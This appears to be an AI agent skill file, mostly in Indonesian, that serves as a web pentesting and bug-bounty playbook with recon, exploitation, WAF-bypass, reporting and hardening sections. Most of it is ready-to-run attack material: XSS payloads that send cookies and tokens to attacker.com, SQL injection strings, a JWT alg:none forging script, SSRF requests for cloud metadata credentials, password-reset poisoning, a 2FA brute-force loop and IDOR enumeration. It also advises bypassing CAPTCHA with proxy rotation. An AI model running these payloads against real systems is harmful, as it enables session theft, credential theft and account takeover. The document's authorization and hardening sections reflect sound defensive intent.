---
name: security-master
description: "Use when pentesting, hardening, or auditing web apps."
version: 1.0.0
author: BREACH
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [security, pentest, bug-bounty, hardening, xss, sqli, idor, jwt, ssrf, api, recon]
    related_skills: [bug-bounty-arsenal, advanced-bug-hunting, web-exploit-test, security-checklist, web-security]
---

# Security Master — Full-Spectrum Playbook

Semua knowledge security dari seluruh sesi — distilasi jadi satu playbook operasional. Untuk testing web sendiri / authorized engagement. Target = target yang LU punya izin buat test.

## When to Use

- Pentest / audit web app (punya izin)
- Bug bounty hunting (program resmi: HackerOne, Bugcrowd, YesWeHack)
- Hardening sebelum launch — test sendiri dulu sebelum orang lain yang nemuin
- Verify fix — habis patch, re-run exploit yang sama buat pastiin mati
- Jangan pernah test web orang tanpa izin. Izin itu syarat mutlak.

## Playbook Flow

```
RECON → ENUMERATE → SCAN → VERIFY MANUAL → EXPLOIT → CHAIN → REPORT → TRACK
```

Scanner nemu ≠ exploitable. Setiap temuan harus diverifikasi manual + dibuktikan impact-nya.

## PART 1 — RECON (Cari Attack Surface Tersembunyi)

### 1.1 Subdomain Enumeration

Kenapa: domain utama punya WAF/security. Subdomain sering lemah (dev, staging, test).

```bash
# Passive (certificate transparency)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | python -c "import json,sys;d=json.load(sys.stdin);print('\n'.join(sorted(set(x['name_value'] for x in d))))"

# Active brute (tanpa tool)
for sub in www api admin dev staging test internal git; do
  host $sub.target.com 2>/dev/null | grep "has address" && echo "$sub.target.com"
done

# Probe alive
cat subs.txt | xargs -I{} sh -c 'curl -s -o /dev/null -w "%{http_code} {}\n" --max-time 5 http://{}' | grep -v "^000"
```

### 1.2 JavaScript Analysis — Sumber Endpoint & Secret

JS file bocorin API endpoints, internal URLs, access tokens, cloud keys.

```bash
# Tarik semua JS
wget -r -l1 -H -t1 -nd -N -np -A.js -erobots=off https://target.com 2>/dev/null
# Atau: fetch dari HTML dulu
curl -s https://target.com | grep -Eo 'src="[^"]*\.js[^"]*"' | cut -d'"' -f2

# Scan pattern sensitif
grep -rE "api[_-]?key|secret|token|password|aws_access|sk_live|AKIA[0-9A-Z]{16}" *.js

# Extract endpoint
grep -Ero "(/api/[^\"']+)" *.js | sort -u
grep -Ero "(https?://[^\"']+)" *.js | sort -u
```

Pattern secret yang dicari:
- AWS: `AKIA[0-9A-Z]{16}` + secret
- Stripe: `sk_live_[a-zA-Z0-9]{20,}`
- GitHub/GitLab: `gh[pousr]_[A-Za-z0-9]{20,}` / `glpat-`
- Slack: `xox[baprs]-`
- Google: `AIza[0-9A-Za-z_-]{35}`
- Firebase: `https://[a-z0-9-]+\.firebaseio\.com`
- Discord webhook: `discord(app)?\.com/api/webhooks/`
- Telegram: `[0-9]{8,10}:[A-Za-z0-9_-]{35}`
- Private key: `-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----`
- MongoDB: `mongodb(\+srv)?://`
- Basic auth: `https?://[^:]+:[^@]+@`

### 1.3 Directory/File Brute

```bash
for p in admin api v1 v2 dev test debug backup .git .env .gitignore wp-admin graphql actuator phpmyadmin swagger docs api-docs .well-known/security.txt robots.txt sitemap.xml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "https://target.com/$p")
  [ "$code" != "404" ] && echo "$code /$p"
done
```

High-value: `/.git` (source leak), `/.env` (secrets), `/actuator` (Spring), `/graphql` (schema), `/swagger` (API docs), `/server-status`, `/phpinfo.php`.

### 1.4 Tech Fingerprint

```bash
curl -sI https://target.com | grep -iE "server|x-powered-by|x-aspnet-version"
# Cek WAF
curl -sI https://target.com | grep -iE "cf-ray|cloudflare|akamai|incapsula|sucuri|aws|fastly"
```

Deteksi framework dari pola: Laravel (`Set-Cookie: laravel_session`), ASP.NET (`X-AspNet-Version`), Next.js (`x-powered-by: Next.js`), WordPress (`/wp-json/`), React SPA (200 buat semua path).

## PART 2 — SCANNER & EXPLOIT BATTERY

### 2.1 Tool yang udah ada (dari sesi)

```bash
# Exploit battery 14 modul — stdlib-only, web sendiri
python skills/security/web-exploit-test/scripts/webtest.py https://target.com --modules headers,exposed,cors,xss,sqli,ssti,traversal,redirect

# Race condition test
python skills/security/web-exploit-test/scripts/race_test.py https://target.com/api/redeem --data '{"code":"PROMO1"}' --n 30

# JWT analysis + forge + weak secret brute
python skills/security/web-exploit-test/scripts/jwt_test.py --jwt eyJhbGc... --url https://target.com/api/me

# Full bounty pipeline: recon → 35 modul scan → PoC report → tracker
python skills/security/bug-bounty-arsenal/scripts/huntall.py target.com --full

# Recon dalam: subdomain + wayback + JS secrets + tech
python skills/security/bug-bounty-arsenal/scripts/recon.py target.com --dns --js --tech

# HAR → endpoint → auto-scan (SPA)
python skills/security/bug-bounty-arsenal/scripts/har2scan.py capture.har --scan
```

### 2.2 Modul Scanner (35+ dari hunter.py)

| Modul | Severity | Yang dites |
|---|---|---|
| `headers` | LOW | Security headers missing |
| `exposed` | CRIT | Dotfiles (.git, .env, backup) |
| `cors` | HIGH | Wildcard/reflected origin |
| `methods` | MED | TRACE/PUT (XST/file write) |
| `admin` | MED/HIGH | Admin panels, actuator, graphql |
| `xss` | HIGH | Reflected XSS |
| `sqli` | HIGH | Error + blind time-based |
| `nosqli` | MED | NoSQL ($ne, $where) |
| `ssti` | HIGH | Template injection {{7*7}} |
| `ssrf` | CRIT | Cloud metadata + internal net |
| `traversal` | CRIT | ../../etc/passwd |
| `redirect` | MED | Open redirect |
| `crlf` | HIGH | Header injection |
| `xxe` | CRIT | XML external entity |
| `jwt` | CRIT/HIGH | alg:none, weak secret |
| `idor` | HIGH | Akses data user lain |
| `graphql` | MED | Introspection + schema dump |
| `massassign` | MED | Role escalation via POST |
| `proto` | MED | Prototype pollution |
| `hostheader` | HIGH | Host header injection |
| `rate` | MED | No rate limit |
| `oauth` | CRIT | redirect_uri tampering |
| `cachepoison` | MED | Cache poisoning |
| `timing` | MED | Username enumeration |

### 2.3 Interpretasi — Jangan Tertipu

- `200 OK ≠ vulnerable` — SPA balas 200 buat semua path. Cek BODY.
- `Reflected ≠ executed` — payload muncul di body belum tentu jalan (ter-escape / JSON string).
- `WAF bisa nge-mask` — 403/406 di payload tertentu = ada WAF — ganti encoding.
- `Rate limit sendiri` — jangan hammer server orang.

## PART 3 — EXPLOIT PLAYBOOK PER BUG CLASS

### 3.1 XSS

```html
<!-- Test dasar -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- Bypass filter -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- DOM XSS -->
location.href="javascript:alert(1)"

<!-- Exploit beneran: cookie/session theft -->
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
<script>fetch('https://attacker.com/?t='+localStorage.getItem('token'))</script>
```

### 3.2 SQL Injection

```sql
-- Error-based
' OR '1'='1
' AND 1=1--
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--

-- Time-based (blind)
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Boolean
' AND '1'='1
' AND '1'='2

-- By DB
-- MySQL: information_schema.tables
-- PostgreSQL: pg_catalog.pg_tables
-- MSSQL: sysobjects, WAITFOR DELAY
-- Oracle: dual, rownum
```

### 3.3 IDOR — Paling Sering Bayar Mahal

```bash
# Login sebagai user A, ambil token
curl -H "Authorization: Bearer TOKEN_A" https://api.target.com/users/123

# Coba akses user B
curl -H "Authorization: Bearer TOKEN_A" https://api.target.com/users/456
# Kalau kebaca → IDOR!
```

```python
# Loop semua ID
for uid in range(1, 1000):
    r = requests.get(f'https://api.target.com/users/{uid}', headers={'Authorization': f'Bearer {tok}'})
    if r.status_code == 200 and 'email' in r.text:
        print(f'IDOR! user {uid}:', r.text[:100])
```

Varian IDOR: UUID bisa ditebak? objek reference di parameter (file_id, order_id, invoice), websocket message, GraphQL field. Jangan cuma numeric — coba juga UUID v1, sequential, base64-encoded ID.

### 3.4 JWT Attack

```bash
# 1. Decode
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. Modifikasi claim: role=user → role=admin, admin=false → true
# 3. Re-sign pakai teknik:
#    a. alg:none — hapus signature, header {"alg":"none"}
#    b. Weak secret brute — hashcat / jwt_tool
#    c. Algorithm confusion — RS256 → HS256 (pakai public key sebagai HMAC secret)
#    d. Kid injection — header {"kid":"../../etc/passwd"} path traversal
```

```python
# JWT alg:none forge (jwt_test.py udah implement)
import base64, json
def b64url(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
header = b64url({"alg":"none","typ":"JWT"})
payload = b64url({"sub":"admin","role":"admin"})
forged = f"{header}.{payload}."
# Test: Authorization: Bearer {forged}
```

### 3.5 SSRF

```bash
# Cloud metadata — AWS
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# GCP
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
# Alibaba
curl "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"

# Internal network scan
curl "https://target.com/fetch?url=http://127.0.0.1:8080/"
curl "https://target.com/fetch?url=http://10.0.0.1/"

# Bypass
# http://localhost → http://2130706433 (decimal IP) → http://[::1]
# Redirect: http://redirect-service?url=http://169.254.169.254
# DNS rebinding, URL parser confusion (http://169.254.169.254@attacker.com)
```

### 3.6 Authentication Bypass

```bash
# Password reset poisoning
# 1. Request reset, 2. Intercept, 3. Ganti Host header:
curl -X POST https://target.com/reset -H "Host: attacker.com" -d "email=victim@x.com"
# → link reset dikirim dengan domain attacker → token ke attacker

# 2FA bypass
# Response manipulation: {"2fa_required": true} → false
# Brute tanpa rate limit
for code in $(seq -w 0 999999); do curl -s -X POST /verify_2fa -d "code=$code" | grep -q "success" && echo "2FA=$code" && break; done
# Reuse code lama (gak di-invalidate)
# Backup code bocor di JS/API response

# Session fixation
# Dapetin token sebelum login, login dengan token itu, victim pake token yang sama

# Mass assignment
# POST /api/users {"username":"x","admin":true}
# POST /api/register {"email":"x@x.com","role":"admin"}
```

### 3.7 Race Condition

```bash
# Endpoint: redeem, checkout, claim, transfer, coupon
for i in {1..100}; do
  curl -s -X POST https://target.com/api/redeem \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code":"PROMO1"}' &
done
wait
# Kalau saldo/promo ke-claim berkali-kali → race condition
# Confirm via DB state, bukan cuma response
```

Fix di sisi dev: transaction + unique constraint + idempotency key.

### 3.8 Business Logic — Scanner Gak Nemu Ini

```bash
# Price manipulation (jangan percaya client)
{"items":[{"id":123,"price":0.01}]}

# Coupon stacking / reuse
# Negative quantity, negative price
# Free shipping abuse, currency confusion

# Referral abuse (sybil)
# 100 akun palsu → refer semua ke 1 akun → bonus gede

# Rate limit bypass
# X-Forwarded-For: 1.2.3.4 (ganti IP)
# X-Real-IP, X-Originating-IP, CF-Connecting-IP, True-Client-IP
# Bypass pakai parameter pollution: ?id=1&id=2

# Account takeover chain
# CSRF + self-XSS = stored XSS
# CSRF + IDOR = full takeover
# Open redirect + token leak = steal
```

### 3.9 GraphQL

```bash
# Introspection — dump semua schema
curl -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name}}}}}"}'

# Cari query/mutation sensitif: deleteUser, updateAdmin, getSecret
# Bypass auth via alias / field-level:
# mutation { a: deleteUser(id:"1") b: deleteUser(id:"2") }
# Batch abuse: multiple queries dalam 1 request
```

### 3.10 API Testing

```bash
# 1. Mass assignment → {"admin":true}
# 2. Broken auth → GET /api/users/123 tanpa token
# 3. Excessive data → GET /api/users return password hash?
# 4. Method tampering → GET /api/admin/delete?id=123
# 5. CORS → Origin: https://evil.com reflected?
# 6. Host header → ganti Host → absolute URL reflected?
# 7. HTTP smuggling → CL.TE / TE.CL
```

## PART 4 — WAF BYPASS

```bash
# Encoding
<script> → %3Cscript%3E → \x3Cscript\x3E → &#x3C;script&#x3E;
# Double URL encode, unicode, overlong UTF-8

# Case
<ScRiPt>alert(1)</sCrIpT>

# Comment injection
<scr<!--x-->ipt>alert(1)</script>
<svg/onload=alert(1)>

# Parameter pollution
?id=1&id=2 → WAF cek 1, server pakai 2

# Header manipulation
X-Forwarded-For: 127.0.0.1 (bypass IP whitelist)
X-Original-URL: /admin (bypass path filter)

# JSON/XML confusion
# {"id":"1' OR '1'='1"} vs form-encoded
# Content-Type: application/json vs x-www-form-urlencoded

# Chunked encoding / gzip smuggling
# Null byte %00, tab/newline di header
```

## PART 5 — CHAINING (Low + Low = Critical)

```
CSRF + IDOR = Account Takeover
Self-XSS + Open Redirect = Stored XSS
Info Disclosure + Weak Password = Account Compromise
SSRF + Internal API = RCE
Open Redirect + OAuth = Token Theft
Host Header + Password Reset = Account Takeover
IDOR + No Rate Limit = Mass Data Exfiltration
Subdomain Takeover + XSS = Full Domain Compromise
```

## PART 6 — REPORTING (Biar Dibayar Mahal)

PoC buat $20k+:
1. Video demo (record exploitation)
2. Step-by-step reproduction (copy-paste command)
3. Real impact — tunjukin data exfil, bukan cuma alert box
4. Business impact — $X revenue loss, Y users affected
5. Suggested fix — code-level

```markdown
# Title: [Severity] [Bug Type] in [Endpoint]

| Field | Value |
|---|---|
| Target | https://target.com |
| Severity | High (8.5/10) |
| CVSS | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N |

## Summary
[business impact singkat]

## Steps to Reproduce
1. ...
2. ...
PoC: curl ...

## Impact
[konsekuensi bisnis]

## Remediation
1. ... 
2. ...
```

Gunakan `pocgen.py` buat auto-generate: `python pocgen.py hunter_results.json --outdir ./reports`

## PART 7 — HARDENING (Sisi Defense — dari checklist)

### Header wajib
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Fix per bug class
| Bug | Fix |
|---|---|
| SQLi | Parameterized query ONLY |
| XSS | Output encoding + CSP + no eval |
| IDOR | Ownership check di tiap endpoint + RLS |
| SSRF | Whitelist URL/domain, block private IP ranges |
| Mass assignment | Whitelist field, reject unknown |
| Race condition | Transaction + unique constraint + idempotency |
| JWT | Strong secret, pin alg, short expiry, deny alg:none |
| Open redirect | Whitelist redirect targets |
| Rate limit | Sliding window per IP + user |
| 2FA bypass | Invalidate code after use, rate limit |
| Host header | Trust X-Forwarded-Host dari trusted proxy only |
| Upload | MIME + signature + rename + luar webroot |

### Verify fix
```
1. Re-run exploit yang sama → harus gagal
2. Re-run scanner → temuan harus hilang
3. Cek regresi — fitur legit jangan rusak
```

## PART 8 — BUG BOUNTY OPERATIONS

### Pilih program
```bash
python skills/security/bug-bounty-arsenal/scripts/programs.py --hackerone --bugcrowd --yeswehack --out programs.json
python skills/security/bug-bounty-arsenal/scripts/programs.py --search "payment"
```

Fokus yang bayar mahal: payment processor ($20-30k critical), identity/auth ($10-20k), Web3/smart contract (millions), e-commerce logic ($2-5k).

### Workflow
```
1. Recon 2-4 jam → subdomain, JS, tech, secrets
2. Pilih 1-2 target paling menjanjikan — baca scope, rules of engagement
3. Auto scan → filter false positive
4. Manual verify — replay, buktiin impact, screenshot/video
5. Report — pocgen, polish, submit
6. Track — tracker.py, respon triage, update bounty
```

### Tracker
```bash
python tracker.py add --target example.com --title "IDOR account data" --severity HIGH --program "HackerOne" --bounty 15000
python tracker.py list
python tracker.py stats
```

### Legal & Etis — WAJIB
1. Hanya target yang LU punya izin (program bounty resmi / web sendiri)
2. Respect scope — jangan sentuh out-of-scope (bisa banned permanen)
3. No DoS, no social engineering ke non-target
4. Responsible disclosure — jangan publish sebelum vendor fix
5. Minimal footprint — jangan rusak fungsionalitas saat testing

## Pitfalls — Dari Pengalaman Sesi

1. **Scanner nemu ≠ exploit** — verification manual wajib
2. **False positive banyak** — jangan spam submit yang belum diverifikasi
3. **200 OK ≠ vulnerable** — SPA balas 200 buat semua path, cek body
4. **Reflected ≠ executed** — payload di body belum tentu jalan
5. **Overclaim severity** — low bug jangan dipaksa critical tanpa proof
6. **WAF masking** — 403/406 di payload = ada WAF, ganti encoding
7. **Rate limit sendiri** — jangan hammer server target
8. **Documentation buruk** — report harus jelas step reproduksinya
9. **Lupa verify fix** — habis patch wajib re-run exploit yang sama
10. **Attack out-of-scope** — bisa banned permanen
11. **CAPTCHA blocks browser automation** — Cloudflare Turnstile, Google reCAPTCHA stop script-based registration. Bypass: use headless browser with proxy rotation, or find API endpoint directly, or exploit auth bypass before signup required.
12. **Supabase RLS blocks anon access** — `/auth/v1/signup` requires valid JWT. Don't brute force API keys; scan JS bundles first, check CSP headers for allowed domains, look for hardcoded service roles in public endpoints.
13. **Next.js SPA intercepts all paths** — `/.well-known/*`, `/api/*`, `/dashboard/*` → 404 if not actual route. Check `_next/static/chunks/*.js` for real API endpoints.
14. **Public attack surface CLEAN doesn't mean safe** — Modern SaaS apps (Next.js + Supabase) often have ALL endpoints protected behind auth + RLS. No immediate exploitable bugs without credentials → shift strategy to authenticated testing (register test account → analyze business logic).
15. **Payment systems usually server-side enforced** — Midtrans/Stripe payment integration requires server secret key. Public endpoints won't return payment config unless logged in. Don't waste time brute-forcing client configs; focus on webhook signatures, callback manipulation, checkout flow after login.
16. **SPA redirect loops trap recon scripts** — All non-existent paths return 404 HTML shell that redirects internally. Use `-L -A "Mozilla/5.0"` curl flag with status codes only (`-o /dev/null -w "%{http_code}"`) instead of full response parsing.

## Tools Ringkas

| Tool | Fungsi |
|---|---|
| webtest.py | Exploit battery 14 modul (stdlib) |
| race_test.py | Race condition parallel requests |
| jwt_test.py | JWT decode/forge/brute |
| huntall.py | Full pipeline recon→scan→report→track |
| recon.py | Subdomain + wayback + JS secrets + tech |
| har2scan.py | HAR capture → endpoint → auto-scan |
| hunter.py | 35 modul vulnerability scanner |
| pocgen.py | PoC report generator (CVSS, CWE) |
| tracker.py | Submission & bounty tracker |
| programs.py | Program bounty scraper |
| burp/mitmproxy | Intercept & modify traffic |
| ffuf/nuclei | Fast fuzzing + template scanning |
| nextjs-audit-checklist.md | **NEW:** Session-specific reference for Next.js + Supabase SaaS apps (see references/ folder) |

## References

See `references/nexjs-supabase-saas-audit-checklist.md` untuk detailed workflow testing Next.js App Router + Supabase backend applications. Template includes command examples, authentication flow analysis, and payment manipulation patterns.
